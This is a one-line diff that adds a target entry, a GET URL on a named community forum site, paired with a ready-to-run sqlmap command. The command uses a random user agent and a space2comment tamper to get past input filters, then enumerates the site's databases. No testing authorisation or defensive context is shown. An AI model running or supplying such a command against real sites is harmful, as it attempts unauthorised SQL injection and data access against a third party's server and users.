@@ -1,0 +1,1 @@
+https://community.modx.com/board.php?id=1 (GET)  # sqlmap.py -u https://community.modx.com/board.php?id=1 --random-agent --tamper=space2comment --level=3 --batch --dbs
